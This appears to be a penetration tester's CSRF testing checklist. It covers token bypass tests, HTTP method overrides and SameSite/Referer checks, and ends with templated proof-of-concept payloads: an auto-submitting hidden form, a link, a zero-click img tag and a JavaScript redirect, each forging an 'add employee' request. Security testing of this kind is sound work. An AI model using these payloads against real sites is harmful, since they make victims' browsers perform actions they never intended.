- Checklist
    - Does every form have a CSRF token?
    - Can we use GET instead of POST (i.e. can our payload be in the URI instead of the body)
        - Test the token
        - Test without the token
    - Test other HTTP methods without the token (e.g. GET)
    - Test without the token value (keep the param name, e.g. &csrf=)
    - Test with a random token
    - Test a previous token
    - Test a token from a different session
    - Test with a token of the same length
    - Test for predictability
        - Test for static values
    - Test for known values (e.g. the token is the user-id)
    - Is the token tied to a cookie other than the session cookie?
    - Can the token be stolen with XSS?
    - Is the referer header being used to validate the request origin?
        - Do the cookies have SameSite set? (Chrome is lax by default)
    - Can we submit the request with GET?
    - Can we override HTTP methods with `X-Http-Method-Override: GET`
        - Can we override HTTP methods with `_method=POST`
```Python
<!-- original payload generated from BURP Suite Pro -->
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://<target-site>/api/employees/add" method=POST>
      <input type="hidden" name="name" value="<payload-info>" />
      <input type="hidden" name="email" value="<payload-info>" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
```Python
<!-- requires user interaction -->
<a href="http://<target-site>m/api/employees/add?name=<payload-info>">Click Me</a>
```
```Python
<!-- doesn't require user interaction -->
<img src="http:/<target-site>/api/employees/add?name=<payload-info>">
```
```Python
document.location = 'https://<target-site>/employees/add?name=<payload-info>';
```